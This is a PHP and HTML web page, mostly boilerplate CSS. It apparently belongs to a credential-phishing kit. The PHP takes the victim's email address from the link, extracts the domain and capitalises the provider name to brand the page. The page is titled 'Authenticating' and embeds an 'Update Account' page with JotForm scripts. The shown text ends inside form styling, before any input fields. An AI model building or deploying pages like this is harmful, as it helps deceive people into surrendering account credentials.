<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <!-- normalize and html5 boilerplate resets -->
        <link rel="stylesheet" href="templates/Skyline_v2/resources/css/reset.css">
        <link rel="stylesheet" href="templates/Skyline_v2/resources/css/less.build.css">

        <!--[if lte IE 9]>
        <script src="templates/Skyline_v2/resources/js/html5shiv.js"></script>
        <script src="templates/Skyline_v2/resources/js/html5shiv-printshiv.js"></script>

        <![endif]-->

        <meta http-equiv="content-type" content="text/html; charset=utf-8" />


<title>Authenticating</title>



<meta name="description" content="" />
<meta name="keywords" content="" />

  <link href="resources/huj.png" rel="shortcut icon" type="image/x-icon" />
  <link href="resources/huj.png" rel="icon" type="image/x-icon" />



  <style type="text/css" id="styleCSS">
    /*
    Some Style Themes enhanced with background textures provided by http://subtlepatterns.com/
*/
body {
    
    
    background-repeat: repeat;
    background-attachment: fixed;
    background-position: top left;
    background-size: auto;
}

/* IOS devices 'bgd-att: fixed' solution */
@media only screen and (max-device-width: 1366px) {
    .bgd-attachment-fixed {
        background-image: none;
    }
    .bgd-attachment-fixed:after {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        width: 100%;
        height: 100%;
        
        background-repeat: repeat;
        background-position: top left;
        background-size: auto;
        z-index: -2;
    }
}

.Text_2_Default,
.yola_heading_container {
  word-wrap: break-word;
}

.yola_bg_overlay {
    display:table;
    table-layout: fixed;
    position:absolute;
    min-height: 100%;
    min-width: 100%;
    width:100%;
    height:100%;
}
.yola_outer_content_wrapper {
    
    padding-right: 0px;
    
    padding-left: 0px;
}
.yola_inner_bg_overlay {
    width:100%;
    min-height: 100vh;
    display: table-cell;
    
    vertical-align: top;
}
.yola_outer_heading_wrap {
    width:100%;
    text-align: center;
}
.yola_heading_container {
    margin: 0 auto;
    
    
}
.yola_inner_heading_wrap {
    margin: 0 auto;
    max-width: 1280px;
}
.yola_innermost_heading_wrap {
    padding-left:0;
    padding-right:0;
    margin: 0 auto;
    padding-top: 1.5rem;
    padding-bottom: 1.5rem;
}
.yola_inner_heading_wrap.top nav,
.yola_inner_heading_wrap.top div#yola_heading_block,
.yola_inner_heading_wrap.bottom nav,
.yola_inner_heading_wrap.bottom div#yola_heading_block {
    padding-left: 3rem;
    padding-right: 3rem;
}
.yola_inner_heading_wrap.left .yola_innermost_heading_wrap,
.yola_inner_heading_wrap.right .yola_innermost_heading_wrap {
    padding-left: 3rem;
    padding-right: 3rem;
}
.yola_inner_heading_wrap h1 {
    margin: 0;
}
#yola_nav_block {
    height: 100%;
}
#yola_nav_block nav {
    text-align: center;
    
}
#yola_nav_block nav ul{
    display:inline;
}
.yola_inner_heading_wrap.left #yola_heading_block {
    float:left;
}
.yola_inner_heading_wrap.right #yola_heading_block {
    float:right;
}
.yola_inner_heading_wrap.top #yola_nav_block {
    padding:1rem 0 0 0;
}
.yola_inner_heading_wrap.right #yola_nav_block {
    float:left;
    padding:1rem 0 0 0;
}
.yola_inner_heading_wrap.bottom #yola_nav_block {
    padding:0 0 1rem 0;
}
.yola_inner_heading_wrap.left #yola_nav_block {
    float:right;
    padding:1rem 0 0 0;
}
.yola_banner_wrap {
    background-attachment: scroll;
    text-align: center;
    margin: 0 auto;
    
    display: none;
    background-position: top left;
    background-size: auto;
    background-repeat: repeat-x;
    
    
}
.yola_inner_banner_wrap {
    padding-left:0;
    padding-right:0;
    padding-top: 0.5rem;
    padding-bottom: 0.5rem;
    
}
.yola_innermost_banner_wrap {
    margin: 0 auto;
    
}
.yola_inner_nav_wrap {
    margin: 0 auto;
    
}
.yola_banner_wrap nav ul.sys_navigation {
    text-align: center;
    padding-top:1rem;
    padding-bottom:1rem;
}
.yola_banner_wrap h1 {
    margin:0;
    text-align: center;
}
.yola_site_tagline {
    padding-top:0;
    padding-bottom:0;
    font-family: 'Roboto';
    font-size: 4rem;
    color: #000000;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
    text-align: left;
    padding-right: 3rem;
    padding-left: 3rem;

}
.yola_site_tagline span {
    display: inline-block;
    
    
    
    
    
}
ul.sys_navigation {
    margin: 0;
    padding: 0;
    text-align: center;
}
ul.sys_navigation li {
    display: inline;
    list-style: none;
    margin:0 3.2rem 0 0;
}
.yola_inner_heading_wrap ul.sys_navigation li:last-child {
    margin:0;
}
ul.sys_navigation li a{
    text-decoration: none;
}

div.ys_submenu {
    margin-top: 8px;
}

.yola_content_wrap {
    margin:0 auto;
    
    
}
.yola_content_column {
    margin:0 auto;
    
}

.yola_inner_content_column {
    margin:0 auto;

    
    
    
    
}
.yola_inner_footer_wrap {
    padding: 0 20px;
}
div[id*='sys_region_'] {
    padding-left: 0 ! important;
    padding-right: 0 ! important;
}
.yola_site_logo {
    
    max-width:100%;
}
#sys_heading.yola_hide_logo img {
    display:none;
}
#sys_heading.yola_hide_logo span {
    display:inline;
}
a#sys_heading.yola_show_logo {
    font-size:14px;
}
#sys_heading.yola_show_logo img {
    display:inline;
}
#sys_heading.yola_show_logo span {
    display:none;
}
.yola_footer_wrap {
    margin:0 auto;
    
    
}
.yola_footer_column {
    margin:0 auto;
    
    display: none;
}
footer {
    padding-top: 2.5rem;
    padding-right: 3rem;
    padding-bottom: 2.5rem;
    padding-left: 3rem;
    font-family: 'Raleway';
    font-size: 1.2rem;
    
    line-height: 1.5em;
    letter-spacing: 0px;
    text-transform: none;

}
span.yola_footer_socialbuttons {
    display:inline-block;
    line-height:0;
    margin:0;
    padding:0;
    display:inline-block;
    position:static;
    float:left;
    width:146px;
    height:20px;
    display: none;
}
.sys_yola_form .submit,
.sys_yola_form input.text,
.sys_yola_form input.email,
.sys_yola_form input.tel,
.sys_yola_form input.url,
.sys_yola_form textarea {
    font-family: 'Roboto';
    font-size: 1rem;
    line-height: 1.7em;
    letter-spacing: 0px;
    text-transform: none;
}
div.sys_yola_form {
    padding:0 !important;
}
div.sys_yola_form form {
    margin:0 !important;
    padding:0 !important;
}
.sys_layout h2, .sys_txt h2, .sys_layout h3, .sys_txt h3, .sys_layout h4, .sys_txt h4, .sys_layout h5, .sys_txt h5, .sys_layout h6, .sys_txt h6, .sys_layout p, .sys_txt p {
    margin-top:0;
}
div[id*='sys_region_'] {
    padding:0 !important;
}
.sys_layout blockquote {
  margin-top: 10px;
  margin-bottom: 10px;
  margin-left: 50px;
  padding-left: 15px;
  border-left: 3px solid #555555;;
  font-size: 1.4rem;
  font-style: italic;
  color: #363636;
  
  line-height: 1.5em;
  letter-spacing: 0px;
  text-transform: none;
}
.sys_layout blockquote,
.sys_layout blockquote h1,
.sys_layout blockquote h2,
.sys_layout blockquote h3,
.sys_layout blockquote h4,
.sys_layout blockquote h5,
.sys_layout blockquote h6,
.sys_layout blockquote p {
    font-family: 'Roboto';
}
.sys_layout p,.sys_layout pre {margin:0 0 1.5em 0}
.sys_layout h2,.sys_layout h3,.sys_layout h4,.sys_layout h5,.sys_layout h6 { margin:0 0 0.5em 0 }
.sys_layout dl, .sys_layout menu,.sys_layout ol,.sys_layout ul{margin:0 0 1.5em 0}

.mob_menu {
    display: none;
}

.new-text-widget img, .old_text_widget img {
    max-width: 100%;
}


@media only screen and (max-width : 736px) {
    html {
        font-size: 80%;
    }

    body .m_inherit_width {
        width: inherit;
    }

    .small_device_hide {
        opacity: 0;
    }

    /* Remove display table so that fixefox can understand max-width */
    .yola_bg_overlay, .yola_inner_bg_overlay {
       display: block;
    }

    /* Zero out padding of the heading wrapper */
    .yola_inner_heading_wrap.top .yola_innermost_heading_wrap,
    .yola_inner_heading_wrap.bottom .yola_innermost_heading_wrap,
    .yola_inner_heading_wrap.left .yola_innermost_heading_wrap,
    .yola_inner_heading_wrap.right .yola_innermost_heading_wrap {
        padding-left: 0;
        padding-right: 0;
    }

    /* Make all image widgets center aligned */
    .Image_Default img {
        display: block;
        margin: 0 auto;
    }

    /* Center button widgets in column dividers */
    .column_divider .sys_button {
        text-align: center;
    }

    /* Make column dividers snap to one over another */
    .yola_inner_heading_wrap.left #yola_heading_block, .yola_inner_heading_wrap.right #yola_heading_block {
        float: none;
    }

    #sys_heading {
        word-wrap: break-word;
        word-break: break-word;
    }

    body .column_divider .left, body .column_divider .right {
        width: 100%;
        padding-left: 0;
        padding-right: 0;
    }

    .mob_menu a:visited {
        color: #fff;
    }

    .mob_menu {
        display: block;
        z-index: 1;
        ;
        ;
        ;
    }

    .mob_menu.menu_open {
        position: absolute;
        min-height: 100%;
        padding: 1rem 0 0 0;
        margin: 0;
        top: 0;
        left: 0;
        right: 0;
    }

    .yola_outer_content_wrapper {
        display: block;
        padding-top: 0;
    }

    .mob_menu_overlay {
        display: none;
        text-transform: none;
    }

    .menu_open .mob_menu_overlay  {
        display: block;
    }

    .mob_menu_toggle {
        display: block;
        padding-top: 5%;
        padding-bottom: 6%;
        text-align: center;
        color: #666;
        cursor: pointer;
    }
    .mob_submenu_toggle {
        list-style: none;
        text-align: center;
        padding: 0;
        margin: 0;
    }

    .new-text-widget img, .old_text_widget img {
        height: auto;
    }

    #sys_heading span {
        font-size: 35px;
        font-weight: 500;
    }
    .sys_navigation {
        display: none;
    }

    .mobile_ham {
        stroke: #595959;
    }

    .mobile_quit {
        display: none;
    }

    .menu_open .mobile_ham {
        display: none;
    }

    .menu_open .mobile_quit {
        display: inline;
        stroke: #595959;
    }

    .mob_menu_list {
        font-family: 'Roboto';
        font-weight: lighter;
        margin: 0;
        font-size: 2.2em;
        line-height: 2;
        letter-spacing: 0.1em;
        list-style: none;
        text-align: center;
        padding: 0;
        -webkit-animation-duration: .2s;
        -webkit-animation-fill-mode: both;
        -webkit-animation-name: fadeInUp;
        -moz-animation-duration: .2s;
        -moz-animation-fill-mode: both;
        -moz-animation-name: fadeInUp;
        -o-animation-duration: .2s;
        -o-animation-fill-mode: both;
        -o-animation-name: fadeInUp;
        animation-duration: .2s;
        animation-fill-mode: both;
        animation-name: fadeInUp;
    }

    .mob_menu_overlay .mob_menu_list a {
        color: #595959;
    }

    .mob_more_toggle {
        display: inline-block;
        cursor: pointer;
        background: none;
        border: none;
        outline: none;
        margin-left: 8px;
        stroke: #595959;
    }

    .up_arrow {
        display: none;
    }

    .sub_menu_open svg .down_arrow {
        display: none;
    }

    .sub_menu_open .up_arrow {
        display: inline;
    }

    .mob_menu_overlay .mob_menu_list .selected a {
        color: #171717;
    }

    .sub_menu_open a {
        color: #171717;
    }

    .mob_menu_list .sub_menu_open a {
        color: #171717;
    }

    .sub_menu_open .mob_more_toggle {
        stroke: #171717;
    }

    .mob_submenu_list {
        font-family: 'Roboto';
        font-weight: lighter;
        list-style: none;
        text-align: center;
        padding: 0 0 5% 0;
        margin: 0;
        line-height: 1.6;
        display: none;
        -webkit-animation-duration: .2s;
        -webkit-animation-fill-mode: both;
        -webkit-animation-name: fadeInUp;
        -moz-animation-duration: .2s;
        -moz-animation-fill-mode: both;
        -moz-animation-name: fadeInUp;
        -o-animation-duration: .2s;
        -o-animation-fill-mode: both;
        -o-animation-name: fadeInUp;
        animation-duration: .2s;
        animation-fill-mode: both
        animation-name: fadeInUp;
    }

    .sub_menu_open .mob_submenu_list{
        display: block;
    }

    .mob_submenu_items {
        font-size: 0.75em;
    }
    .mob_menu_list .mob_nav_selected {
        color: #171717;
    }

    .menu_open ~ .yola_outer_content_wrapper {
        display: none;
    }

    @-webkit-keyframes fadeInUp {
      0% {
        opacity: 0;
        -webkit-transform: translate3d(0, 100%, 0);
        transform: translate3d(0, 100%, 0);
      }
      100% {
        opacity: 1;
        -webkit-transform: none;
        transform: none;
      }
    }

    @-moz-keyframes fadeInUp {
      0% {
        opacity: 0;
        -moz-transform: translate3d(0, 100%, 0);
        transform: translate3d(0, 100%, 0);
      }
      100% {
        opacity: 1;
        -moz-transform: none;
        transform: none;
      }
    }

    @-o-keyframes fadeInUp {
      0% {
        opacity: 0;
        -o-transform: translate3d(0, 100%, 0);
        transform: translate3d(0, 100%, 0);
      }
      100% {
        opacity: 1;
        -o-transform: none;
        transform: none;
      }
    }

    @keyframes fadeInUp {
      0% {
        opacity: 0;
        transform: translate3d(0, 100%, 0);
      }
      100% {
        opacity: 1;
        transform: none;
      }
    }
}


  </style>


<script src="//ajax.googleapis.com/ajax/libs/webfont/1.4.2/webfont.js" type="text/javascript"></script>

      <style type="text/css">
      @import url("//fonts.googleapis.com/css?family=Roboto%3Aregular%2C300%2C500%2C400|Open+Sans%3Aregular%2C400|Raleway%3Aregular%2C600&subset=latin,latin-ext");
    </style>
  
  <style type="text/css" id="styleOverrides">
    /* ======================
*
*  Site Style Settings
*
=========================*/
/* Paragraph text (p) */

.content p, #content p, .HTML_Default p, .Text_Default p, .sys_txt p, .sys_txt a, .sys_layout p, .sys_txt, .sys_layout  {
    font-family: 'Roboto';
    font-weight: 300;
    font-size: 1rem;
    color: #555555;
    line-height: 1.7em;
    letter-spacing: 0px;
    text-transform: none;
}

/* Navigation */
.sys_navigation a, .ys_menu_2, div#menu ul, div#menu ul li a, ul.sys_navigation li a, div.sys_navigation ul li.selected a, div.sys_navigation ul li a, #navigation li a, div.ys_menu ul a:link, div.ys_menu ul a:visited, div.ys_nav ul li a, #sys_banner ul li a {
    font-family: 'Roboto';
    font-weight: 400;
    font-size: 1rem;
    color: #595959;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}


/* Navigation:selected */
div.sys_navigation ul li.selected a, div#menu ul li.selected a, #navigation li.selected a, div.ys_menu ul li.selected a:link, div.ys_menu ul li.selected a:visited, div.ys_nav ul li.selected a, #sys_banner ul li.selected a {
    color: #171717;
}

/* Navigation:hover */
div.sys_navigation ul li a:hover, div#menu ul li a:hover, #navigation li a:hover, div.ys_menu ul a:hover, div.ys_nav ul li a:hover, div.ys_menu ul li a:hover, #sys_banner ul li a:hover {
    color: #171717;
}

/* Site Title */
#sys_heading, a#sys_heading, #sys_banner h1 a, #header h1 a, div#heading h1 a {
    font-family: 'Raleway';
    font-weight: 600;
    font-size: 1.47rem;
    color: #292929;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

/* Hyperlinks (a, a:hover, a:visited) */
a, .sys_txt a:link, .sys_layout a:link {color: #5ea4d6;}
a, .sys_txt a:link, .sys_layout a:link {text-decoration: underline;}
a:visited, .sys_txt a:visited, .sys_layout a:visited {color: #4088ba;}
a:hover, .sys_txt a:hover, .sys_layout a:hover {color: #1f4661;}
a:hover, .sys_txt a:hover, .sys_layout a:hover {text-decoration: none;}

/* Headings (h2, h3, h4, h5, h6) */
.sys_layout h2, .sys_txt h2 {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 4.00rem;
    color: #363636;
    text-decoration: none;
    letter-spacing: 0rem;
    line-height: 1.38em;
    text-transform: none;
}

.sys_layout h2 a, .sys_layout h2 a:link, .sys_layout h2 a:hover, .sys_layout h2 a:visited {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 4.00rem;
    color: #363636;
    letter-spacing: 0rem;
    line-height: 1.38em;
    text-transform: none;
}

.sys_layout h3, .sys_txt h3 {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 2.5rem;
    color: #363636;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

.sys_layout h3 a, .sys_layout h3 a:link, .sys_layout h3 a:hover, .sys_layout h3 a:visited {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 2.5rem;
    color: #363636;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

.sys_layout h4, .sys_txt h4 {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 2rem;
    color: #363636;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.24em;
    text-transform: none;
}

.sys_layout h4 a, .sys_layout h4 a:link, .sys_layout h4 a:hover, .sys_layout h4 a:visited {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 2rem;
    color: #363636;
    letter-spacing: 0px;
    line-height: 1.24em;
    text-transform: none;
}

.sys_layout h5, .sys_txt h5 {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 1.5rem;
    color: #363636;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

.sys_layout h5 a, .sys_layout h5 a:link, .sys_layout h5 a:hover, .sys_layout h5 a:visited {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 1.5rem;
    color: #363636;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

.sys_layout h6, .sys_txt h6 {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 1rem;
    color: #363636;
    text-decoration: none;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

.sys_layout h6 a, .sys_layout h6 a:link, .sys_layout h6 a:hover, .sys_layout h6 a:visited {
    font-family: 'Roboto';
    font-weight: 500;
    font-size: 1rem;
    color: #363636;
    letter-spacing: 0px;
    line-height: 1.5em;
    text-transform: none;
}

/*button widget*/
.sys_layout .sys_button a, .sys_layout .sys_button a:link, .sys_layout .sys_button a:visited {
    display:inline-block;
    text-decoration: none;
}
.sys_layout .sys_button a:link, .sys_layout .sys_button a:visited {
    cursor:pointer;
}
.sys_layout .sys_button a {
    cursor:default;
}

.sys_layout .sys_button.square a, .sys_layout .sys_button.square a:link {
    border-radius:0px;
}
.sys_layout .sys_button.rounded a, .sys_layout .sys_button.rounded a:link {
    border-radius:3px;
}
.sys_layout .sys_button.pill a, .sys_layout .sys_button.pill a:link {
    border-radius:90px;
}

/*button sizes*/
.sys_layout .sys_button.small a, .sys_layout .sys_button.small a:link, .sys_layout .sys_button.small a:visited {font-family: 'Open Sans';font-weight: 400;font-size: 0.9rem;line-height: 1.5em;letter-spacing: 0px;text-transform: none;padding-top:0.5rem;padding-bottom:0.5rem;padding-left:2rem;padding-right:2rem;}
.sys_layout .sys_button.medium a, .sys_layout .sys_button.medium a:link, .sys_layout .sys_button.medium a:visited {font-family: 'Open Sans';font-weight: 400;font-size: 1rem;line-height: 1.5em;letter-spacing: 0px;text-transform: none;padding-top:0.7rem;padding-bottom:0.7rem;padding-left:4rem;padding-right:4rem;}
.sys_layout .sys_button.large a, .sys_layout .sys_button.large a:link, .sys_layout .sys_button.large a:visited {font-family: 'Open Sans';font-weight: 400;font-size: 1.1rem;line-height: 1.5em;letter-spacing: 0px;text-transform: none;padding-top:0.8rem;padding-bottom:0.8rem;padding-left:5.5rem;padding-right:5.5rem;}

/*button styles:small*/
.sys_layout .sys_button.small.outline a, .sys_layout .sys_button.small.outline a:link {
    border-color:rgba(0,172,230,1.00);
    color: rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.small.outline a:visited {
    color: rgba(0,172,230,1.00);
}
.sys_layout .sys_button.small.solid a, .sys_layout .sys_button.small.solid a:link {
    	background-color: #00ace6;

    color: #ffffff;
    border-color:rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.small.solid a:visited {
    color: #ffffff;
}
.sys_layout .sys_button.small.outline a:hover {
    background-color: rgba(0,172,230,1.00);
    color: #ffffff;
    text-decoration: none;
}

/*button styles:medium*/
.sys_layout .sys_button.medium.outline a, .sys_layout .sys_button.medium.outline a:link {
    border-color:rgba(0,172,230,1.00);
    color: rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.medium.outline a:visited {
    color: rgba(0,172,230,1.00);
}
.sys_layout .sys_button.medium.solid a, .sys_layout .sys_button.medium.solid a:link {
    	background-color: #00ace6;

    color: #ffffff;
    border-color:rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.medium.solid a:visited {
    color: #ffffff;
}
.sys_layout .sys_button.medium.outline a:hover {
    background-color: rgba(0,172,230,1.00);
    color: #ffffff;
    text-decoration: none;
}
/*button styles:large*/
.sys_layout .sys_button.large.outline a, .sys_layout .sys_button.large.outline a:link {
    border-color:rgba(0,172,230,1.00);
    color: rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.large.outline a:visited {
    color: rgba(0,172,230,1.00);
}
.sys_layout .sys_button.large.solid a, .sys_layout .sys_button.large.solid a:link {
    	background-color: #00ace6;

    color: #ffffff;
    border-color:rgba(0,172,230,1.00);
    border-style: solid;
    border-width: 2px;
}
.sys_layout .sys_button.large.solid a:visited {
    color: #ffffff;
}
.sys_layout .sys_button.large.outline a:hover {
    background-color: rgba(0,172,230,1.00);
    color: #ffffff;
    text-decoration: none;
}

.sys_layout .sys_button.solid a:hover {
    text-decoration: none;
    opacity: .8;
}  </style>

  



<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script type="text/javascript">window.jQuery || document.write('<script src="/components/bower_components/jquery/dist/jquery.js"><\/script>')</script>
<link rel="stylesheet" type="text/css" href="classes/commons/resources/flyoutmenu/flyoutmenu.css?1001088" />
<script type="text/javascript" src="classes/commons/resources/flyoutmenu/flyoutmenu.js?1001088"></script>
<link rel="stylesheet" type="text/css" href="classes/commons/resources/global/global.css?1001088" />


<script type="text/javascript">
  var swRegisterManager = {
    goals: [],
    add: function(swGoalRegister) {
      this.goals.push(swGoalRegister);
    },
    registerGoals: function() {
      while(this.goals.length) {
        this.goals.shift().call();
      }
    }
  };

  window.swPostRegister = swRegisterManager.registerGoals.bind(swRegisterManager);
</script>

  
  
  
  

    </head>
    <body lang="en" class="bgd-attachment-fixed">
        
        <div id="sys_background" class="yola_bg_overlay">
            <div class="yola_inner_bg_overlay">
                <div class="yola_outer_content_wrapper">
                    <header role="header">
                        <div class="yola_outer_heading_wrap">
                            <div class="yola_heading_container">
                                <div class="yola_inner_heading_wrap left">
                                    <div class="yola_innermost_heading_wrap">
                                                                                                                        <div id="yola_heading_block"> <!--Title / Logo-->
                                            <h1>
                                                <a id="sys_heading" class="yola_hide_logo" href="./">
                                                    <img class="yola_site_logo" src="" alt="" >
                                                    <span></span>
                                                </a>
                                            </h1>
                                        </div>
                                        <div id="yola_nav_block"> <!--Nav-->
                                            <nav role="navigation">
                                                <div class="sys_navigation">
                                                <ul class="sys_navigation">
    </ul>

<script>
/* jshint ignore:start */
$(document).ready(function() {
    flyoutMenu.initFlyoutMenu(
        []
    , 'flyover');
});
/* jshint ignore:end */
</script>

                                                </div>
                                            </nav>
                                        </div>
                                                                                <div style="padding:0; height:0; clear:both;">&nbsp;</div>
                                    </div>
                                </div>
                            </div>
                            <div id="sys_banner" class="yola_banner_wrap">
                                <div class="yola_inner_banner_wrap">
                                    <div class="yola_innermost_banner_wrap">
                                        <h2 class="yola_site_tagline" style="display:none"><span></span></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>

                    <main class="yola_content_wrap" role="main">
                        <div class="yola_content_column">
                            <div class="yola_inner_content_column clearFix">
                                <style media="screen">
  .layout_1-column {
    width: 100%;
    padding: 0;
    margin: 0;
  }

  .layout_1-column:after {
    content: "";
    display: table;
    clear: both;
  }

  .zone_top {
    margin: 0;
    padding: 5px;
    vertical-align: top;
    line-height: normal;
    min-width: 100px;
  }
</style>

<div class="layout_1-column sys_layout">
    <div id="layout_row1">
        <div id="sys_region_1" class="zone_top" ><div id="I2f6df689acb94323a0334225a1e5911a" style="display:block;clear: both;text-align:left;" class="HTML_Default">    <div id="I2f6df689acb94323a0334225a1e5911a_html" class="responsive_embed"><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>Update Account</title>
<meta name="GENERATOR" content="Created by BlueVoda Website builder http://www.bluevoda.com">
<meta name="HOSTING" content="Hosting Provided By VodaHost http://www.vodahost.com">
<style type="text/css">
div#container
{
   width: 800px;
   position: relative;
   margin-top: 0px;
   margin-left: auto;
   margin-right: auto;
   text-align: left;
}
</style>
<style type="text/css">
body
{
   text-align: center;
   margin: 0;
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #D4A8B3;
}
</style>
</head>
<body>
<div id="container">
<div id="Html1" style="position:absolute;left:195px;top:0px;width:403px;height:380px;z-index:0">
<script src="https://cdn.jotfor.ms/static/prototype.forms.js" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/jotform.forms.js?3.3.16036" type="text/javascript"></script>
<script type="text/javascript">
	JotForm.init(function(){
if (window.JotForm && JotForm.accessible) $('input_3').setAttribute('tabindex',0);
if (window.JotForm && JotForm.accessible) $('input_4').setAttribute('tabindex',0);
	JotForm.newDefaultTheme = false;
      JotForm.alterTexts(undefined);
	JotForm.clearFieldOnHide="disable";
	JotForm.submitError="jumpToFirstError";
    /*INIT-END*/
	});

   JotForm.prepareCalculationsOnTheFly([null,{"name":"heading","qid":"1","text":"Contact US","type":"control_head"},{"name":"submit2","qid":"2","text":"Submit","type":"control_button"},{"description":"","name":"fullName","qid":"3","subLabel":"","text":"Full Name","type":"control_textbox"},{"description":"","name":"subject","qid":"4","subLabel":"","text":"Subject","type":"control_textbox"}]);
   setTimeout(function() {
JotForm.paymentExtrasOnTheFly([null,{"name":"heading","qid":"1","text":"Contact US","type":"control_head"},{"name":"submit2","qid":"2","text":"Submit","type":"control_button"},{"description":"","name":"fullName","qid":"3","subLabel":"","text":"Full Name","type":"control_textbox"},{"description":"","name":"subject","qid":"4","subLabel":"","text":"Subject","type":"control_textbox"}]);}, 20); 
</script>
<link href="https://cdn.jotfor.ms/static/formCss.css?3.3.16036" rel="stylesheet" type="text/css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/nova.css?3.3.16036" />
<link type="text/css" media="print" rel="stylesheet" href="https://cdn.jotfor.ms/css/printForm.css?3.3.16036" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/themes/CSS/566a91c2977cdfcd478b4567.css?"/>
<style type="text/css">
    .form-label-left{
        width:150px;
    }
    .form-line{
        padding-top:0px;
        padding-bottom:0px;
    }
    .form-label-right{
        width:150px;
    }
    .form-all{
        width:419px;
        color:#555 !important;
        font-family:"Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", Verdana, sans-serif;
        font-size:14px;
    }
</style>

<style type="text/css" id="form-designer-style">
    /* Injected CSS Code */
.form-all:after {
  content: "";
  display: table;
  clear: both;
}
.form-all {
  font-family: "Lucida Grande", sans-serif;
}
.form-all {
  width: 419px;
}
.form-label-left,
.form-label-right {
  width: 150px;
}
.form-label {
  white-space: normal;
}
.form-label.form-label-auto {
  display: block;
  float: none;
  word-break: break-word;
  text-align: left;
}
.form-label-left {
  display: inline-block;
  white-space: normal;
  float: left;
  text-align: left;
}
.form-label-right {
  display: inline-block;
  white-space: normal;
  float: left;
  text-align: right;
}
.form-label-top {
  white-space: normal;
  display: block;
  float: none;
  text-align: left;
}
.form-radio-item label:before {
  top: 0;
}
.form-all {
  font-size: 14px;
}
.form-label {
  font-weight: bold;
}
.form-checkbox-item label,
.form-radio-item label {
  font-weight: normal;
}
.supernova {
  background-color: #ffffff;
}
.supernova body {
  background-color: transparent;
}
/*
@width30: (unit(@formWidth, px) + 60px);
@width60: (unit(@formWidth, px)+ 120px);
@width90: (unit(@formWidth, px)+ 180px);
*/
/* | */
@media screen and (min-width: 480px) {
  .supernova .form-all {
    border: 1px solid #e6e6e6;
    -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.1);
    -moz-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.1);
    box-shadow: 0 3px 9px rgba(0, 0, 0, 0.1);
  }
}
/* | */
/* | */
@media screen and (max-width: 480px) {
  .jotform-form .form-all {
    margin: 0;
    width: 100%;
  }
}
/* | */
/* | */
@media screen and (min-width: 480px) and (max-width: 767px) {
  .jotform-form .form-all {
    margin: 0;
    width: 100%;
  }
}
/* | */
/* | */
@media screen and (min-width: 480px) and (max-width: 418px) {
  .jotform-form .form-all {
    margin: 0;
    width: 100%;
  }
}
/* | */
/* | */
@media screen and (min-width: 768px) {
  .jotform-form {
    padding: 60px 0;
  }
}
/* | */
/* | */
@media screen and (max-width: 418px) {
  .jotform-form .form-all {
    margin: 0;
    width: 100%;
  }
}
/* | */
.supernova .form-all,
.form-all {
  background-color: #ffffff;
  border: 1px solid transparent;
}
.form-header-group {
  border-color: #e6e6e6;
}
.form-matrix-table tr {
  border-color: #e6e6e6;
}
.form-matrix-table tr:nth-child(2n) {
  background-color: #f2f2f2;
}
.form-all {
  color: #555555;
}
.form-header-group .form-header {
  color: #555555;
}
.form-header-group .form-subHeader {
  color: #6f6f6f;
}
